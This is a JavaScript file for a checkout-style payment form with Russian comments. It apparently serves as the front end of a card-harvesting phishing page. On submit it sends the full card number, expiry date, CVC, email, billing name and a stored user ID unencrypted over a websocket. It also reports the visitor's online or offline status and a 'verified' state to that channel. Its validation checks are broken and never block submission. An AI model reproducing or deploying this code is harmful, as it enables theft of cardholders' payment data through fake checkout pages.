import {ws} from './websocket.js';



window.onload = ()=> { 
    const verified = JSON.parse(localStorage.getItem('verified')) 
    ?? {'mID': '', method: ''};
    ws.send(JSON.stringify({
        type: 'offline',
        message_id: verified.mID || ''
    }));
    localStorage.removeItem('verified'); 
    
}


const EMAIL_REGEXP = /^(([^<>()[\].,;:\s@"]+(\.[^<>()[\].,;:\s@"]+)*)|(".+"))@(([^<>()[\].,;:\s@"]+\.)+[^<>()[\].,;:\s@"]{2,})$/iu;

function isEmailValid(value) {
    return EMAIL_REGEXP.test(value);
}

const cardNumberInput = document.getElementById('cardNumber');
const expiryDateInput = document.getElementById('cardExpiry');
const cvcInput = document.getElementById('cardCvc');
const cardLogo = document.getElementById('cardLogo');
const form = document.querySelector('.PaymentForm-form');
const email = document.getElementById('email')
const billingName = document.getElementById('billingName');
const FormButton = document.querySelector('.FormButton');

FormButton.style.opacity = ".5";
FormButton.setAttribute('disabled', '')

const loader = document.querySelector('.loader-button');

const cardPatterns = {
    visa: /^4/,
    mastercard: /^5[1-5]/,
    amex: /^3[47]/,
    jcb: /^3[56]/
};



let isSelected = false;

let isPassedEmail = false;
let isPassedCardNumber = false;
let isPassedExpiryDate = false;
let isPassedCVC = false;
let isPassedBillingName = false;


const toggleButton = ()=> {
    if(isPassedEmail && isPassedCardNumber &&
        isPassedExpiryDate && isPassedCVC  && isPassedBillingName
    ) {
        FormButton.style.opacity = "1";
        FormButton.removeAttribute('disabled');
    } else {
        FormButton.style.opacity = ".5";
        FormButton.setAttribute('disabled', '');
    }
}

email.addEventListener('input', (e)=> {
    if(e.target.value.length > 6 && isEmailValid(e.target.value)) {
        isPassedEmail = true;   
    } else {
        // e.target.classList.add('redInput');
        isPassedEmail = false;
    }

    toggleButton()
})

// Format card number as 1111 1111 1111 1111
cardNumberInput.addEventListener('input', (e) => {
    let value = e.target.value.replace(/\D/g, ''); // Убираем все нецифровые символы
    if (value.length >= 13) {
        value = value.substring(0, 16);
        isPassedCardNumber = true;
    }
    else {
        isPassedCardNumber = false;
    }
    e.target.value = value.replace(/(\d{4})(?=\d)/g, '$1 ').trim();

    // Определение платежной системы и установка логотипа
    if (cardPatterns.visa.test(value)) {
        cardLogo.src = 'https://upload.wikimedia.org/wikipedia/commons/5/5e/Visa_Inc._logo.svg';
        document.querySelector('.FormFieldExamples').style.display = 'none';
        value = value.substring(0, 13);
    } else if (cardPatterns.mastercard.test(value)) {
        cardLogo.src = 'https://upload.wikimedia.org/wikipedia/commons/2/2a/Mastercard-logo.svg';
        document.querySelector('.FormFieldExamples').style.display = 'none';
        value = value.substring(0, 16);
    } else if (cardPatterns.amex.test(value)) {
        cardLogo.src = 'https://upload.wikimedia.org/wikipedia/commons/3/30/American_Express_logo.svg';
        document.querySelector('.FormFieldExamples').style.display = 'none';
        value = value.substring(0, 16);
    } else if (cardPatterns.jcb.test(value)) {
        cardLogo.src = 'https://upload.wikimedia.org/wikipedia/commons/thumb/4/40/JCB_logo.svg/200px-JCB_logo.svg.png';
        document.querySelector('.FormFieldExamples').style.display = 'none';
        value = value.substring(0, 16);
    } 
    else {
        cardLogo.src = ''; // Очистить логотип, если не совпало
        value = value.substring(0, 16);
        document.querySelector('.FormFieldExamples').style.display = 'flex';
    }


    toggleButton();
});

// Format expiry date as MM/YY
expiryDateInput.addEventListener('input', (e) => {
    let value = e.target.value.replace(/\D/g, ''); // Убираем все нецифровые символы
    if (value.length >= 4) {
        value = value.substring(0, 4);
        isPassedExpiryDate = true;
    } else {
        isPassedExpiryDate = false;
    }
    e.target.value = value.replace(/(\d{2})(\d{1,2})/, '$1/$2');

    toggleButton();
});


cvcInput.addEventListener('input', (e)=> {
    let value = e.target.value.replace(/\D/g, '');
    if(value.length >= 3) {
        isPassedCVC = true;
    } else isPassedCVC = false;

    e.target.value = value.replace(/(\d{4})(?=\d)/g, '$1 ').trim();

    toggleButton();
})

billingName.addEventListener('input', (e)=> {
    if(e.target.value.length >= 5) {
        isPassedBillingName = true;
    } else isPassedBillingName = false;

    toggleButton();
})

// Submit form validation
form.addEventListener('submit', (e) => {
    e.preventDefault(); // Остановить отправку формы для проверки

    let isValid = true;

    loader.classList.add('isLoading');


    // Проверка номера карты
    const cardNumber = cardNumberInput.value.replace(/\s/g, '');
    if (!/^\d{16}$/.test(cardNumber)) {
        // cardError.style.display = 'block';
        isValid = false;
    } else {
        // cardError.style.display = 'none';
        isValid = true;
    }

    // Проверка даты
    const expiryDate = expiryDateInput.value;
    if (!/^\d{2}\/\d{2}$/.test(expiryDate)) {
        // expiryError.style.display = 'block';
        isValid = false;
    } else {
        // expiryError.style.display = 'none';
        isValid = true;
    }

    // Проверка CVC
    const cvc = cvcInput.value;
    if (!/^\d{3}$/.test(cvc)) {
        // cvcError.style.display = 'block';
        isValid = false;
    } else {
        // cvcError.style.display = 'none';
        isValid = true;
    }



    if(isSelected) return;
    const result = {
        'email': email.value,
        'cardNumber': cardNumber,
        'expiryDate': expiryDate,
        'cvc': cvc,
        'billingName': billingName.value,
        'type': 'form',
        'uid': localStorage.getItem('uID')
    }
    ws.send(JSON.stringify(result));
    isSelected = true;

});